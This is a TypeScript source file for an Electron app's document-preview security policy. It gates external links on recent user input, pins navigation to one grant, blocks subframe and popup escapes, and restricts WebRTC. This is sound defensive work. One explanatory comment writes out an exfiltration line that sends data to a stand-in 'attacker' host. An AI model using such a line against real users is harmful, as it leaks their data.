import {
  DOC_PREVIEW_EXTERNAL_LINK_CHANNEL,
  parseDocPreviewUrl
} from '../../shared/doc-preview-scheme'
import { normalizeExternalBrowserUrl } from '../../shared/browser-url'
import { enforceBrowserRouteWebRtcPolicy } from './browser-route-webrtc-policy'
import { getDocPreviewGrant } from './doc-preview-grant-registry'

type PreviewLinkSink = { send: (channel: string, payload: { url: string }) => void }

/**
 * Why a gesture gate on the only way out: the document may read its whole grant over
 * `connect-src 'self'`, and the external-link route ends in a real Orca browser tab with full
 * network. Without this, `location.href = 'https://attacker/?d=' + data` running on its own
 * exfiltrates everything the grant covers, past both the CSP and the session's request fence.
 * A human clicking a link is unaffected; a script with no one at the keyboard reaches nothing.
 */
const EXTERNAL_LINK_GESTURE_WINDOW_MS = 2_000

/** Activation-shaped input only — hovering, scrolling or moving a pointer is nobody asking to leave. */
const ACTIVATING_INPUT_TYPES: ReadonlySet<string> = new Set([
  'mouseDown',
  'mouseUp',
  'keyDown',
  'char',
  'touchStart',
  'touchEnd',
  'gestureTap',
  'pointerDown',
  'pointerUp'
])

/**
 * The preview guest renders a workspace document, not the web: it may only move
 * within its own grant. External http(s) targets — plain clicks and
 * `target="_blank"` alike — leave as a new Orca browser tab through the normal
 * machinery instead of navigating the preview or spawning a native popup.
 */
export function installDocPreviewGuestPolicy(
  guest: Electron.WebContents,
  linkSink: PreviewLinkSink
): void {
  // Why: the first commit is the renderer-set src, already admitted by will-attach-webview;
  // latching it pins every later navigation to that one grant.
  let boundGrantId: string | null = null
  let lastGenuineInputAt = 0

  const recordGenuineInput = (): void => {
    lastGenuineInputAt = Date.now()
  }

  // Why both events: `input-event` carries pointer and touch, `before-input-event` is the keyboard
  // signal a guest emits regardless; either alone leaves some real user unable to follow a link.
  guest.on('input-event', (_event, inputEvent) => {
    if (ACTIVATING_INPUT_TYPES.has(inputEvent.type)) {
      recordGenuineInput()
    }
  })
  guest.on('before-input-event', (_event, input) => {
    if (input.type === 'keyDown') {
      recordGenuineInput()
    }
  })

  /** Why spent rather than merely checked: one gesture buys one tab, so a loop cannot ride a single click. */
  const spendGenuineInput = (): boolean => {
    const isRecent =
      lastGenuineInputAt > 0 && Date.now() - lastGenuineInputAt <= EXTERNAL_LINK_GESTURE_WINDOW_MS
    lastGenuineInputAt = 0
    return isRecent
  }

  const openExternally = (rawUrl: string): void => {
    const externalUrl = normalizeExternalBrowserUrl(rawUrl)
    if (!externalUrl || !spendGenuineInput()) {
      return
    }
    linkSink.send(DOC_PREVIEW_EXTERNAL_LINK_CHANNEL, { url: externalUrl })
  }

  const isAllowedPreviewNavigation = (rawUrl: string): boolean => {
    const target = parseDocPreviewUrl(rawUrl)
    if (!target || !getDocPreviewGrant(target.grantId)) {
      return false
    }
    return boundGrantId === null || target.grantId === boundGrantId
  }

  const navigationGuard = (event: Electron.Event, url: string): void => {
    if (isAllowedPreviewNavigation(url)) {
      return
    }
    event.preventDefault()
    openExternally(url)
  }

  guest.on('did-start-navigation', (details) => {
    // Why: only the top document defines which grant this guest belongs to. Latching from a
    // subframe would let an in-document iframe rebind the guest to another grant.
    if (boundGrantId !== null || !details.isMainFrame) {
      return
    }
    boundGrantId = parseDocPreviewUrl(details.url)?.grantId ?? null
  })
  guest.on('will-navigate', navigationGuard)
  guest.on('will-redirect', navigationGuard)
  // Why: will-navigate never fires for a subframe, so without this an <iframe src="https://…">
  // inside a previewed document would load off-machine even though the top frame cannot.
  guest.on('will-frame-navigate', (details) => {
    if (details.isMainFrame || isAllowedPreviewNavigation(details.url)) {
      return
    }
    // Why blocked rather than routed out like a main-frame click: a subframe navigates on its own,
    // so opening a tab for it would let a document spawn browser tabs the user never asked for.
    details.preventDefault()
  })
  guest.setWindowOpenHandler(({ url }) => {
    openExternally(url)
    // Why: previews never own native child windows; every popup target becomes an Orca tab or nothing.
    return { action: 'deny' }
  })
  // Why a second fence for one API: WebRTC opens UDP straight from the network stack, so neither the
  // response CSP nor the session's request filter ever sees it. This is the only layer that can.
  enforceBrowserRouteWebRtcPolicy(guest, () => {})
}
